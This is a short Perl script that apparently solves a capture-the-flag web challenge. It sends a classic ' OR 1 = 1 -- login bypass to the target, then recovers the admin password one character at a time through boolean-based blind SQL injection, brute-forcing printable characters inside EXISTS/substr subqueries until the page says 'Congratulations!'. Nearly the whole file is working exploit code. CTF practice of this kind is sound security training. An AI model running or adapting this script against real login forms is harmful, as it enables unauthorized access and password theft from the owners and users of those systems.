use common::sense;

use LWP::UserAgent;

my $url = 'http://ctfq.sweetduet.info:10080/~q6/';

my $ua = LWP::UserAgent->new;

# confirm sql injection
$ua->post(
    $url,
    {   id   => 'admin',
        pass => "' OR 1 = 1 -- ",
    }
)->decoded_content;

# pass length
for my $length (1 .. 50) {
    last;

    my $res = $ua->post(
        $url,
        {   id   => 'admin',
            pass => "' OR EXISTS (
                SELECT 1 FROM user WHERE id = 'admin' AND LENGTH(pass) = $length
            ) -- ",
        }
    )->decoded_content;

    if ($res =~ /Congratulations!/) {
        warn $length;
        last;
    }
}

# password blute force
my $pass;
do {
    my $at = $_;
    for my $char (33 .. 126) {
        my $letter = chr($char);
        my $res    = $ua->post(
            $url,
            {   id   => 'admin',
                pass => "' OR EXISTS (
                  SELECT 1 FROM user WHERE id = 'admin' AND substr(pass, $at, 1) = '$letter'
              ) -- ",
            }
        )->decoded_content;
        if ($res =~ /Congratulations!/) {
            $pass .= $letter;
            last;
        }
    }
    }
    for 1 .. 21;
warn $pass;

